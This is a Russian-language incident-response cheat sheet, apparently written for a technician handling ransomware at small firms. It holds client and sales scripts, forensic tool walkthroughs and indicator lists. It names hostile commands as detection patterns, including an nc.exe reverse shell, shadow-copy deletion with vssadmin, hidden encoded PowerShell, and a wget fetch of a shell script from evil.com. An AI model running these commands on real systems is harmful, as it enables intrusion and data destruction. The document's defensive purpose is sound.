💬 Скрипты разговора
📞 По телефону — первые слова
«Понял вас. Первое что нужно сделать прямо сейчас — выдерните кабели от всех компьютеров. Серверы не выключайте — только кабели. Сфотографируйте телефоном что написано на экране. Я выезжаю / подключаюсь удалённо. Ничего не нажимайте и не перезагружайте.»
🏢 На месте — объяснение директору
Что произошло:
«Взломщики зашли через удалённый доступ и зашифровали ваши файлы. Это называется ransomware. Они требуют выкуп — платить не рекомендую, нет гарантий что дадут ключ. Сейчас смотрю есть ли возможность восстановить без выкупа.»
Если есть бэкап:
«Хорошая новость — нашёл резервную копию. Восстановим данные на [дату бэкапа]. Потеряете данные за [период] — это неприятно но лучше чем платить выкуп без гарантий.»
Если бэкапа нет:
«Резервных копий нет. Проверяю другие варианты — теневые копии Windows и возможность восстановить файлы. Если не получится — есть платные лаборатории. Честно скажу что возможно а что нет.»
😔 Если не восстановили
«К сожалению данные восстановить не удалось — резервных копий не было и файлы перезаписаны. Я закрыл дыру через которую зашли, составил акт для полиции и настроил мониторинг. Теперь если кто-то снова попытается — я узнаю первым. Чтобы такого не повторилось — давайте настроим автоматическое резервное копирование.»
Важно
  • Не извиняйся избыточно — ты не виноват что не было бэкапа
  • Акцент на том что ты сделал и что защитил на будущее
  • Сразу предлагай настройку бэкапа — продаётся легко после потери
💰 Продажа ретейнера после выезда
Базовый заход:
«Вы узнали о взломе когда всё уже зашифровали. Я могу поставить систему которая сообщит мне при первой попытке входа — раньше чем что-то случится. Стоит 5 000 рублей в месяц. Один день простоя вашей 1С стоит дороже.»
Если говорят «дорого»:
«Понимаю. Давайте тогда хотя бы настроим автоматический бэкап 1С — это разово 5 000 рублей. Тогда если снова взломают — восстановимся за 30 минут а не потеряем данные.»
Если говорят «позвоним если что»:
«Конечно. Вот моя карточка. Но имейте в виду — следующий раз взломщики уже знают что здесь есть что брать. Обычно возвращаются через 2-3 месяца. Мой номер сохраните.»
Правило продажи
  • Не продавай — решай проблему клиента
  • Говори цифрами: «5000 vs потеря месяца данных»
  • Всегда оставляй карточку — даже если отказали

Красные флаги
🚨 Опасно — смотреть внимательно
  • PowerShell или cmd → внешний IP
  • Процесс из Temp / AppData / ProgramData
  • Название похоже на системное: svch0st, svchost32
  • Незнакомый пользователь Enabled: True
  • Много 4625 с одного IP подряд = брутфорс
  • 4720 которого не ожидали = скрытый аккаунт
  • Порты 4444 / 1337 / 31337 = хакерские инструменты
✅ Норма — не беспокоиться
  • Тип входа 5 — СИСТЕМА, services.exe
  • 127.0.0.1 — локальный адрес, сам компьютер
  • Процессы из C:\Windows\ или C:\Program Files\
  • svchost.exe, explorer.exe, lsass.exe
🔍 Sysmon — признаки атаки
🚨 Опасные команды в логах
  • nc.exe … -e cmd.exe — обратный шелл, злоумышленник получил управление
  • mshta.exe запустил powershell — LOLBIN атака через HTA файл
  • ftp.exe от пользователя — загрузка файлов через LOLBIN
  • set comspec= — подмена cmd.exe, закрепление в системе
  • Invoke-WebRequest + нестандартный порт — скачивание вредоноса
  • _MEIxxxxx\python27.dll в Temp — PyInstaller малварь на Python
  • Image в C:\Windows\Temp\ — процесс из временной папки = подозрительно
🔎 Что искать через FullEventLogView
  • В CommandLine: nc.exe, mshta, ftp, -e cmd, set comspec
  • DestinationPort нестандартный — не 80 / 443 / 53
  • Нестандартные порты атакующих: 4444, 6969, 8080, 1234, 9898
  • Процессы LOLBIN: mshta.exe, ftp.exe, certutil.exe, rundll32.exe
  • PowerShell с флагами -nop -w hidden -e = зашифрованная команда
📋 Типичная цепочка атаки
  • 1️⃣ Фишинг / HTA файл → первоначальный доступ
  • 2️⃣ PowerShell скачивает бэкдор (supply.exe / rat.exe)
  • 3️⃣ set comspec= → закрепление в системе
  • 4️⃣ ipconfig / whoami → разведка сети
  • 5️⃣ JuicyPotato / nc.exe → повышение привилегий + шелл

💾 Теневые копии
⚡ Проверить до восстановления
  • Теневые копии — первый шанс восстановить без бэкапа
  • Взломщики удаляют их — но не всегда успевают
Шаг 1 — Найти копии
✅ Если копии есть
  • Видишь даты — проверь есть ли копия ДО атаки
  • Дата атаки = когда компьютеры начали тормозить
  • Нужна копия старше этой даты
❌ Взломщики удаляют этой командой
  • vssadmin delete shadows /all /quiet
  • Если видишь в логах — копий нет, идём к бэкапу
Шаг 2 — Подключить как папку
После подключения
  • C:\ShadowRestore — вся система на момент копии
  • Найди нужные файлы и скопируй
  • Путь к 1С базе смотри ниже

Шаг 3 — Удалить ссылку после работы
🏥 Восстановление 1С
0 / 6 шагов
Сначала проверь

💾 Руководство по флешке
⚡ Работает офлайн — всё здесь

🔍 Autoruns — автозапуск
Запуск
Autoruns.exe → правая кнопка → Запуск от администратора
Что делаешь:
Нажать вкладку Everything — видишь всё
Смотришь колонку Publisher (издатель)
Смотришь колонку Image Path (путь к файлу)
Фиксируешь подозрительные записи
🚨 Красные флаги
  • Publisher пустой или «Not Verified»
  • Путь в Temp / AppData / ProgramData
  • Название похоже на системное: svch0st, svchost32
  • Розовый/красный фон записи
✅ Норма — не трогать
  • Verified Microsoft / Google / известный вендор
  • Жёлтый фон + File not found = мусор, не опасно
  • Путь C:\Windows\ или C:\Program Files\
Нашёл подозрительное:
  • Снять галочку — отключить автозапуск
  • Правая кнопка → Delete — удалить запись
  • Записать путь к файлу для акта
  • Найти и удалить сам файл вируса
⚙️ SystemInformer — процессы
Запуск
systeminformer-bin\ → SystemInformer.exe → от администратора
Цвета процессов:
Синий — системные (СИСТЕМА) — норма
Фиолетовый — сервисы Windows — норма
Зелёный — только что запустился
Красный — завершается (мигает — норма)
Вкладка Network — главная:
🚨 Опасно в Network
  • PowerShell.exe → внешний IP
  • cmd.exe → любой внешний IP
  • Незнакомый процесс → порты 4444, 1337, 31337
  • Много соединений на один подозрительный IP
Нашёл подозрительный процесс:
  • Правая кнопка на процессе → Properties → смотри путь
  • Правая кнопка → Terminate — убить процесс
  • Записать PID и путь для акта
  • Потом найти в Autoruns и убрать из автозапуска
📋 FullEventLogView — логи
Запуск
fulleventlogview\ → FullEventLogView.exe → от администратора
Настройка фильтра:
Options → Advanced Options
Show only specified channels → написать: Security
Show only specified Event IDs → 4624,4625,4720,4672
Нажать OK → F5 для обновления
🚨 Что ищешь
  • 4625 много раз подряд с одного IP = брутфорс
  • 4624 тип 10 с внешнего IP = зашли по RDP
  • 4720 — создан новый пользователь (взломщик)
  • Незнакомое имя пользователя в событиях
Нашёл подозрительное:
  • Записать IP атакующего — идёт в акт
  • Записать время первого входа — это начало атаки
  • File → Save Selected Items — сохранить на свою флешку
🔄 Recuva — восстановление файлов
Запуск
RecuvaPortable\ → RecuvaPortable.exe → от администратора
Когда использовать:
  • Нет бэкапа и нет теневых копий
  • Взломщик зашифровал файлы — оригиналы мог удалить
  • Удалённый файл ещё на диске если не перезаписан
Пошагово:
Выбрать диск клиента (C: или D:)
Нажать Scan — ждать 2-5 минут
В поиске написать: 1Cv8 или .dt или .docx
Зелёный кружок = восстановим, красный = нет
Выбрать зелёные файлы → Recover
Сохранить на СВОЮ флешку (не на диск клиента!)
⚠️ Важно
  • Никогда не сохраняй восстановленные файлы на тот же диск
  • Чем больше работает машина — тем меньше шансов восстановить
  • Если нашёл 1С базу — сразу восстанавливай

🐧 Linux audit.log
Что такое audit.log
  • Журнал безопасности Linux (аналог EventLog в Windows)
  • Записывает входы, команды, файлы, сетевые соединения
  • Читается текстовым редактором или grep
Ключевые поля
acct= имя пользователя
Кого атакуют или кто вошёл
acct="btlo" → пользователь btlo
addr= IP адрес
Откуда пришло подключение
addr=192.168.4.155 → IP атакующего
res= результат
Успешно или нет
res=success / res=failed
a0= a1= a2= аргументы команды
a0 = команда, a1 = первый аргумент
a0="wget" a1="http://evil.com/shell.sh"
uid= / euid= пользователь
uid = реальный, euid = эффективный
euid=0 → процесс работает как root!
pid= / ppid= ID процесса
pid = процесс, ppid = родитель
ppid=1234 → запущен процессом 1234
comm= / exe= имя и путь
comm = имя команды, exe = полный путь
comm="wget" exe="/usr/bin/wget"
Типы записей
USER_AUTH Попытка входа (SSH, sudo)
USER_LOGIN Вход в систему
EXECVE Запуск команды/программы
SYSCALL Системный вызов (содержит pid, uid)
PATH Обращение к файлу (поле name=)
Алгоритм анализа
Последовательность поиска
  • 1. Найти res=failed → кто атаковал (addr=)
  • 2. Найти res=success → когда прорвались
  • 3. Найти EXECVE после входа → что делали (a0=)
  • 4. Найти euid=0 → когда получили root
  • 5. Найти PATH после root → что украли (name=)
